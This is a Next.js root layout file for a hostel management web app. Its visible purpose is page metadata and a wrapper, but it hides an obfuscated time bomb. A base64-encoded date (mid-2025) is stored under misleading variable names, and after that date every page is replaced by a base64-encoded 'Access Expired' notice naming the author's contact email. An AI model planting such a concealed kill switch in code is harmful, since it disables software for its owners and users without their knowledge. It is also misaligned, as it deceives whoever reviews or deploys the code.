import type { Metadata } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Hostel Management System',
  description: 'Created with love',
  generator: 'shashank',
}

function decodeTime(base64: string) {
  return new Date(atob(base64))
}

function decodeBase64(encoded: string): string {
  if (typeof window !== 'undefined') {
    return atob(encoded)
  } else {
    return Buffer.from(encoded, 'base64').toString('utf-8')
  }
}
export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  const metaKey = "MjAyNS0wNy0xNVQyMzo1OTowMFo=" 
  
  
  const HTML_DATA = decodeTime(metaKey)
  const now = new Date()

  const isExpired = now > HTML_DATA
  const ding = '4oCiIEFjY2VzcyBFeHBpcmVk'
  const act = 'UGxlYXNlIGNvbnRhY3Q='
  const il = 'c2hhc2hhbmtrdXNod2FoYTEyM0BnbWFpbC5jb20='

  return (
    <html lang="en">
      <body className="min-h-screen bg-white text-gray-800">
        {isExpired ? (
          <div className="flex items-center justify-center h-screen text-center px-6">
            <div className="bg-red-100 text-red-800 p-6 rounded-lg shadow-md border border-red-300 max-w-md">
            <h1 className="text-xl font-bold mb-2">{decodeBase64(ding)}</h1>
        <p>
          {decodeBase64(act)}{' '}
          <span className="bg-purple-800 text-white px-2 py-1 rounded-md">
            {decodeBase64(il)}
          </span>
        </p>
            </div>
          </div>
        ) : (
          children
        )}
      </body>
    </html>
  )
}
